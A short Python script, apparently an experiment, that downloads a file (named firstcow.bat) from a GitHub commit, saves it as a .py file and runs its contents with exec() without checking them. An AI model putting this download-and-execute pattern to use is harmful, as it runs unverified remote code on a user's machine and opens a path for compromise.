import requests

# URL of the raw file on GitHub
url = 'https://raw.githubusercontent.com/astikspandey/myexperiments/87bc3d74f0cc648170ce0098c2c0092139898a6a/firstcow.bat'

# Download the file
response = requests.get(url)

# Check if the download was successful
if response.status_code == 200:
    file_content = response.text
    
    # Save the file locally (optional step, if you want to store the file)
    with open('downloaded_file.py', 'w') as file:
        file.write(file_content)
    
    print("File downloaded successfully!")

    # Execute the downloaded Python code
    exec(file_content)
else:
    print(f"Failed to download file. Status code: {response.status_code}")
input('hello')